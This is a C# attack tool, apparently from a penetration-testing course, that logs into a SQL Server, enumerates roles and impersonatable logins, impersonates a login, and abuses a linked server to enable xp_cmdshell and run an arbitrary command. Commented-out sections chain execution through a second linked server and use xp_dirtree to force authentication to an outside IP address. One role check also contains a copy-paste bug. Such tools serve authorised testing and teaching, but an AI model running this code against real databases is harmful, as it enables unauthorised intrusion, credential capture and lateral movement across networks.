using System;
using System.Data.SqlClient;

namespace SqlCustomLinkedServer
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args == null || args.Length != 2)
            {
                Console.WriteLine("Usage: " + System.AppDomain.CurrentDomain.FriendlyName + " sqlserver \"payload\"\n");
                Environment.Exit(0);
            }

            // Strings
            String sqlServer = args[0];
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            //String conString = "Server = " + sqlServer + "; Database = " + database + "; UID=sa;PWD='';";
            //String conString = "Server = " + sqlServer + "; Database = " + database + "; User Id=sa;Password='';";

            String payload = args[1];
            String resPayload = "";
            String resQuery = "";
            String openqueryHost = "DB02";
            String doubleOpenqueryHost = "DB02\\SQLEXPRESS";

            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] Auth success");
            }
            catch
            {
                Console.WriteLine("[!] Auth failed");
                Environment.Exit(0);

            }

            string execQuery(string queryCommand)
            {
                SqlCommand execCommand = new SqlCommand(queryCommand, con);
                SqlDataReader execReader = execCommand.ExecuteReader();

                try
                {
                    String result = "";
                    while (execReader.Read() == true)
                    {
                        result += execReader[0] + "\n";
                    }
                    execReader.Close();
                    return result;
                }
                catch
                {
                    return "";
                }

            }

            // Enum public role
            try
            {
                String querypublicrole = execQuery("SELECT IS_SRVROLEMEMBER('public');");
                String querysysadminrole = execQuery("SELECT IS_SRVROLEMEMBER('sysadmin');");
                Int32 publicrole = Int32.Parse(querypublicrole.ToString());
                Int32 sysadminrole = Int32.Parse(querypublicrole.ToString());
                if (publicrole == 1)
                {
                    Console.WriteLine("[+] User is a member of a public role");
                }
                else
                {
                    Console.WriteLine("[+] User is NOT member of a public role");
                }
                if (sysadminrole == 1)
                {
                    Console.WriteLine("[+] User is a member of a sysadmin role");
                }
                else
                {
                    Console.WriteLine("[+] User is NOT member of a sysadmin role");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Error reading role: \n" + e.ToString());
                con.Close();
                Environment.Exit(0);
            }

            // Enumerate login impersonation permissions
            try
            {
                String queryimpersonate = execQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';");
                Console.WriteLine("[+] Logins that can be impersonated: " + queryimpersonate);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Error enumerating permissions: \n" + e.ToString());
                con.Close();
                Environment.Exit(0);
            }

            // Trying to impersonate
            try
            {
                String querysyslogin = execQuery("EXEC AS LOGIN = 'dev_int'; SELECT SYSTEM_USER;");
                //String querysyslogin = execQuery("EXEC AS LOGIN = 'sa'; SELECT SYSTEM_USER;");
                //String querysyslogin = execQuery("use msdb; EXECUTE AS USER = 'dbo'; SELECT USER_NAME()");
                String querysystemuser = execQuery("SELECT SYSTEM_USER;");
                String queryusername = execQuery("SELECT USER_NAME();");
                String currentServer = execQuery("SELECT @@SERVERNAME;");
                Console.WriteLine("[+] Executing as systemuser \n" + querysystemuser + " using username " + queryusername + " on " + currentServer);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Error impersonating: \n" + e.ToString());
                con.Close();
                Environment.Exit(0);
            }

            //Attempt to add linked servers
            //try
            //{
            //    //String enumLinked = execQuery("EXEC master.dbo.sp_addlinkedserver @server = N'" + openqueryHost + "', @provider=N'SQLNCLI',@srvproduct = 'MS SQL Server', @datasrc=N'" + openqueryHost + "\\SQLEXPRESS';");
            //    String enumLinked = execQuery("EXEC master.dbo.sp_addlinkedserver @server = N'" + openqueryHost + "\\SQLEXPRESS';");
            //    //String enumLinked = execQuery("EXEC master.dbo.sp_addlinkedserver @server = N'" + openqueryHost + "';");
            //    Console.WriteLine("[+] Added linked servers:\n" + enumLinked);
            //}
            //catch (Exception e)
            //{
            //    Console.WriteLine("[!] Error adding linked servers: \n" + e.ToString());
            //    con.Close();
            //    Environment.Exit(0);
            //}

            //Enum linked servers
            try
            {
                String enumLinked = execQuery("EXEC sp_linkedservers;");
                Console.WriteLine("[+] Linked servers:\n" + enumLinked);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Error enumerating linked servers: \n" + e);
                con.Close();
                Environment.Exit(0);
            }

            // Enumerate SQL user using OPENQUERY
            try
            {
                string openquerylogin = execQuery("select login from openquery(\"" + openqueryHost + "\", 'select system_user as login');");
                string openqueryuser = execQuery("select login from openquery(\"" + openqueryHost + "\", 'select user_name() as login');");
                // get server from openquery
                string openqueryserver = execQuery("select current_server from openquery(\"" + openqueryHost + "\", 'select @@servername as current_server');");
                Console.WriteLine("[+] Executing as systemuser\n " + openquerylogin + " using username " + openqueryuser + " on " + openqueryserver);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Error enumerating using openquery: \n" + e);
                con.Close();
                Environment.Exit(0);
            }

            ////// Enum double linked server
            //try
            //{
            //    resQuery = execQuery("select login from openquery(\"" + openqueryHost + "\", 'select system_user as login');");
            //    Console.WriteLine("[+] Current user via double link is:\n" + resQuery);
            //    //resQuery = execQuery("select login from openquery(\"" + openqueryHost + "\", 'select login from openquery(\"" + doubleOpenqueryHost + "\", ''select system_user as login'')');");
            //    //Console.WriteLine("[+] Systemuser via double link is:\n" + resQuery);
            //    //resQuery = execQuery("select username from openquery(\"" + openqueryHost + "\", 'select username from openquery(\"" + doubleOpenqueryHost + "\", ''select user_name() as username'')');");
            //    //Console.WriteLine("[+] Username via double link is:\n" + resQuery);
            //    //resQuery = execQuery("select current_server from openquery(\"" + openqueryHost + "\", 'select current_server from openquery(\"" + doubleOpenqueryHost + "\", ''select @@servername as current_server'')');");
            //    //Console.WriteLine("[+] Current server via double link is:\n" + resQuery);
            //    //resQuery = execQuery("select name from openquery(\"" + openqueryHost + "\", 'select name from openquery(\"" + doubleOpenqueryHost + "\", ''select name from master.sys.sysusers as name where islogin = 1'')');");
            //    //Console.WriteLine("[+] Enumerated logins are:\n" + resQuery);
            //    resQuery = execQuery("select 1 from openquery(\"" + openqueryHost + "\", 'select 1 from openquery(\"" + doubleOpenqueryHost + "\", ''EXEC XP_DIRTREE(''''\\\\192.168.49.85\\123'''' as 1'')');");
            //    Console.WriteLine("[+] Executing xp_dirtree\n" + resQuery);
            //}
            //catch (Exception e)
            //{
            //    Console.WriteLine("[!] error enumerating double linked server using openquery: \n" + e);
            //    con.Close();
            //    Environment.Exit(0);
            //}

            //Enable exec using AT via openquery
            try
            {
                execQuery("EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT \"" + openqueryHost + "\";");
                execQuery("EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT \"" + openqueryHost + "\";");
                resPayload = execQuery("EXEC ('xp_cmdshell ''" + payload + "'';') AT \"" + openqueryHost + "\";");
                Console.WriteLine("[+] Output of command is:\n" + resPayload);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Error executing using openquery: \n" + e);
                con.Close();
                Environment.Exit(0);
            }

            // Executing payload
            //try
            //{
            //    execQuery("EXEC('EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT \"" + doubleOpenqueryHost + "\"') AT \"" + openqueryHost + "\";");
            //    execQuery("EXEC('EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT \"" + doubleOpenqueryHost + "\"') AT \"" + openqueryHost + "\";");
            //    resPayload = execQuery("EXEC('EXEC(''xp_cmdshell ''''" + payload + "'''';'') AT \"" + doubleOpenqueryHost + "\"') AT \"" + openqueryHost + "\";");

            //    Console.WriteLine("[+] Output of command is:\n" + resPayload);
            //}
            //catch (Exception e)
            //{
            //    Console.WriteLine("[!] Error executing payload: \n" + e);
            //    con.Close();
            //    Environment.Exit(0);
            //}


            con.Close();
        }
    }
}
